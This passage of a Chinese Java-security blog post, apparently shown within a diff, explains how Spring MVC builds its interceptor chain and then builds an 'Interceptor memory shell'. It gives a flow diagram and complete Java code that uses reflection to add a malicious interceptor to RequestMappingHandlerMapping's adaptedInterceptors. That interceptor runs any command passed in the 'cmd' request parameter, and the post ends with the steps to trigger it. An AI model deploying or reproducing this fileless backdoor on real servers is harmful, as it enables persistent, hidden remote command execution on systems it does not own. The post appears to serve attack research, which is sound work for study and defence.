class="type">MappedInterceptor</span> <span class="variable">mappedInterceptor</span> <span class="operator">=</span> (MappedInterceptor)interceptor;</span><br><span class="line">               <span class="keyword">if</span> (mappedInterceptor.matches(request)) &#123;</span><br><span class="line">                   chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               chain.addInterceptor(interceptor);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> chain;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码的主要作用是为特定请求构建完整的处理器执行链，包括处理器本身以及适用的拦截器：</p>
+<ol>
+<li>创建或转换 HandlerExecutionChain：
+<ul>
+<li>如果传入的 handler 已经是 HandlerExecutionChain 类型，则直接使用</li>
+<li>否则，创建一个新的 HandlerExecutionChain 实例，并将 handler 作为处理器添加进去</li>
+</ul>
+</li>
+<li>添加适用的拦截器：
+<ul>
+<li>遍历所有适配的拦截器 this.adaptedInterceptors</li>
+<li>对于 MappedInterceptor 类型的拦截器：
+<ul>
+<li>检查它是否适用于当前请求（通过 mappedInterceptor.matches (request) 方法）</li>
+<li>如果匹配，则将其内部的实际拦截器添加到执行链中</li>
+</ul>
+</li>
+<li>对于其他类型的拦截器：
+<ul>
+<li>直接添加到执行链中（这些通常是全局拦截器）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>返回完整的执行链：
+<ul>
+<li>最终返回一个包含了处理器和所有适用性拦截器的执行链</li>
+</ul>
+</li>
+</ol>
+<p>这段代码的核心就是<code>chain.addInterceptor(interceptor) </code>, 它的作用是将拦截器添加到处理器执行链中</p>
+<p>查看<code>adaptedInterceptors</code>的类型</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> List&lt;HandlerInterceptor&gt; adaptedInterceptors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br></pre></td></tr></table></figure>
+<p><strong>在 Interceptor 内存马攻击中，利用反射机制获取 <code>AbstractHandlerMapping</code> 中的私有字段 <code>adaptedInterceptors</code>，并绕过访问控制（setAccessible(true)），将一个实现了 <code>HandlerInterceptor</code> 接口的恶意类实例直接添加到该列表中。由于该列表是所有请求共享的拦截器源，一旦注入成功，后续任意 HTTP 请求只要经过该 HandlerMapping 的处理流程，就会触发恶意 <code>preHandle</code> 方法，从而实现无文件落地的远程命令执行。</strong></p>
+<p>在一开始的调试中,</p>
+<p><img src="/images/image-20251028204953732.png" alt="image-20251028204953732"></p>
+<p><code>preHandle</code> 是被 <code>DispatcherServlet</code> 驱动的，中间经过了 <code>HandlerExecutionChain</code>。</p>
+<p>所以大致流程</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DispatcherServlet → getHandler() </span><br><span class="line">               → mapping.getHandler() </span><br><span class="line">               → getHandlerExecutionChain() </span><br><span class="line">               → 遍历 this.adaptedInterceptors 把每个 interceptor 加入 chain</span><br></pre></td></tr></table></figure>
+<h2 id="编写内存马">编写内存马</h2>
+<h3 id="前置了解">前置了解</h3>
+<ul>
+<li>
+<h4 id="必须参与每一次请求处理">必须参与每一次请求处理</h4>
+<ul>
+<li>内存马不是一次性后门，而是<strong>持久化监听机制</strong>。</li>
+<li>所以恶意逻辑必须在 <strong>每个匹配的 HTTP 请求</strong> 中被自动</li>
+</ul>
+</li>
+<li>
+<h4 id="必须进入-HandlerExecutionChain">必须进入 <code>HandlerExecutionChain</code></h4>
+<ul>
+<li>Spring MVC 在处理请求时，会为每个请求创建一个 <code>HandlerExecutionChain</code>。</li>
+<li>这个链包含：
+<ul>
+<li>目标处理器（如 Controller 方法）</li>
+<li>所有匹配的 <code>HandlerInterceptor</code> 拦截器</li>
+</ul>
+</li>
+<li>只有在这个链中的拦截器，才会被 <code>applyPreHandle()</code> 调用。</li>
+</ul>
+<blockquote>
+<p>所以：<strong>恶意拦截器必须出现在 <code>HandlerExecutionChain</code> 中</strong></p>
+</blockquote>
+</li>
+<li>
+<h4 id="必须在-adaptedInterceptors-中">必须在 <code>adaptedInterceptors</code> 中</h4>
+<ul>
+<li>
+<p>查看 <code>AbstractHandlerMapping.getHandlerExecutionChain()</code> 源码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandlerExecutionChain</span><span class="params">(Object handler, HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">HandlerExecutionChain</span> <span class="variable">chain</span> <span class="operator">=</span> ...;</span><br><span class="line">    <span class="keyword">for</span> (HandlerInterceptor interceptor : <span class="built_in">this</span>.adaptedInterceptors) &#123;</span><br><span class="line">        chain.addInterceptor(interceptor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> chain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关键点：</p>
+<ul>
+<li><code>this.adaptedInterceptors</code> 是拦截器的<strong>唯一来源</strong></li>
+<li>它是一个 <code>List&lt;HandlerInterceptor&gt;</code>，存储了所有注册的拦截器</li>
+<li>所有请求都会遍历它，把里面的拦截器加入当前 <code>chain</code></li>
+</ul>
+<blockquote>
+<p>所以：<strong>只要你的拦截器在 <code>adaptedInterceptors</code> 里，就会自动进入每一个 <code>HandlerExecutionChain</code></strong></p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>
+<h4 id="必须拿到持有它的实例">必须拿到持有它的实例</h4>
+<ul>
+<li><code>adaptedInterceptors</code> 是 <code>AbstractHandlerMapping</code> 的 <strong><code>protected final</code> 字段</strong></li>
+<li>虽然不能重新赋值，但其内部的 <code>List</code> 是可变的（<code>ArrayList</code>），可以 <code>add</code> 元素</li>
+<li>但你必须先拿到 <strong>那个正在被使用的 <code>HandlerMapping</code> 实例</strong></li>
+</ul>
+<p>而在标准 Spring Boot 应用中：</p>
+<ul>
+<li>处理 <code>@Controller</code> 和 <code>@RequestMapping</code> 的是 <code>RequestMappingHandlerMapping</code></li>
+<li>它继承自 <code>AbstractHandlerMapping</code>，因此持有 <code>adaptedInterceptors</code></li>
+<li>它是 Spring 自动创建并注册的单例 Bean</li>
+<li>几乎所有动态请求都会经过它</li>
+</ul>
+<blockquote>
+<p>所以：<strong>必须获取 <code>RequestMappingHandlerMapping</code> 实例</strong></p>
+</blockquote>
+</li>
+<li>
+<h4 id="必须通过-WebApplicationContext">必须通过 <code>WebApplicationContext</code></h4>
+</li>
+<li>
+<p>攻击者处于一个“外来代码执行”环境（如反序列化、SpEL 注入）</p>
+</li>
+<li>
+<p>他无法直接new RequestMappingHandlerMapping() —— 因为：</p>
+<ul>
+<li>这个 Bean 有复杂的依赖（如 <code>ContentNegotiationManager</code>）</li>
+<li>即使 new 出来也不会被 <code>DispatcherServlet</code> 使用</li>
+</ul>
+</li>
+<li>
+<p>唯一可靠的方式是：从 Spring 容器中取出 <strong>正在运行的那个实例</strong></p>
+</li>
+</ul>
+<p>而 <code>WebApplicationContext</code> 正是：</p>
+<ul>
+<li>Spring Web 应用的<strong>根容器</strong></li>
+<li>管理所有 Bean 的生命周期</li>
+<li>提供 <code>getBean(Class)</code> 方法来获取指定类型的 Bean</li>
+</ul>
+<p>所以：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ...; <span class="comment">// 获取上下文</span></span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">rmhm</span> <span class="operator">=</span> </span><br><span class="line">    context.getBean(RequestMappingHandlerMapping.class); <span class="comment">// 取出真实实例</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>所以：<strong>必须先获取 <code>WebApplicationContext</code>，才能拿到 <code>RequestMappingHandlerMapping</code></strong></p>
+</blockquote>
+<h3 id="流程">流程</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|                     攻击者触发漏洞                         |</span><br><span class="line">|                                                           |</span><br><span class="line">|  (例如：反序列化、SpEL 注入等)                           |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|               进入 HTTP 请求处理线程                      |</span><br><span class="line">|                                                           |</span><br><span class="line">|  (具备 Request 上下文)                                    |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|       获取 WebApplicationContext 实例                     |</span><br><span class="line">|                                                           |</span><br><span class="line">|  通过 RequestContextHolder.currentRequestAttributes()    |</span><br><span class="line">|  和 getAttribute(&quot;org.springframework.web.servlet.       |</span><br><span class="line">|  DispatcherServlet.CONTEXT&quot;, 0) 获取上下文                |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|   从容器中获取 RequestMappingHandlerMapping 实例          |</span><br><span class="line">|                                                           |</span><br><span class="line">|  context.getBean(RequestMappingHandlerMapping.class)      |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|   反射访问 adaptedInterceptors 字段                       |</span><br><span class="line">|                                                           |</span><br><span class="line">|  Field field = AbstractHandlerMapping.class.getDeclaredField|</span><br><span class="line">|  (&quot;adaptedInterceptors&quot;);                                |</span><br><span class="line">|  field.setAccessible(true);                              |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|   修改 List&lt;HandlerInterceptor&gt; interceptors              |</span><br><span class="line">|                                                           |</span><br><span class="line">|  List&lt;HandlerInterceptor&gt; interceptors =                  |</span><br><span class="line">|  (List&lt;HandlerInterceptor&gt;) field.get(rmhm);              |</span><br><span class="line">|  interceptors.add(new MaliciousInterceptor());            |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|        恶意拦截器已成功注入到全局拦截器列表                |</span><br><span class="line">|                                                           |</span><br><span class="line">|  此时，所有匹配该 HandlerMapping 的请求都会经过           |</span><br><span class="line">|  包含恶意拦截器的 HandlerExecutionChain                   |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|     用户发起任意 HTTP 请求（如 /index.html?cmd=whoami）   |</span><br><span class="line">|                                                           |</span><br><span class="line">|  触发 DispatcherServlet.doDispatch()                      |</span><br><span class="line">|  → mapping.getHandler(request)                            |</span><br><span class="line">|  → getHandlerExecutionChain()                             |</span><br><span class="line">|  → 遍历 this.adaptedInterceptors                          |</span><br><span class="line">|  → chain.applyPreHandle()                                 |</span><br><span class="line">|  → 触发 MaliciousInterceptor.preHandle()                  |</span><br><span class="line">|  → 执行命令（如 Runtime.exec(cmd)）                       |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|         命令执行结果返回给攻击者                          |</span><br><span class="line">|                                                           |</span><br><span class="line">|  （例如：弹出计算器、回显系统命令输出等）                 |</span><br><span class="line">+-----------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="完整代码">完整代码</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.interceptordemo.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InterceptorShell</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">inject</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (context != <span class="literal">null</span>) &#123;</span><br><span class="line">            r = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            List&lt;HandlerInterceptor&gt; list = (List&lt;HandlerInterceptor&gt;) field.get(r);</span><br><span class="line">            list.add(<span class="keyword">new</span> <span class="title class_">TestInterceptor</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;inject success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;preHandle&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="keyword">return</span> HandlerInterceptor.<span class="built_in">super</span>.preHandle(request, response, handler);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>访问<code>/inject</code>路径注入</p>
+<p>然后访问<code>/inject?cmd=calc</code>等就可以触发</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/23/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BSpring-Controller%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Java安全之Spring Controller内存马">
+                  <i class="fa fa-angle-left"></i> Java安全之Spring Controller内存马
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/10/27/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BTomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="Java安全之Tomcat Valve内存马">
+                  Java安全之Tomcat Valve内存马 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
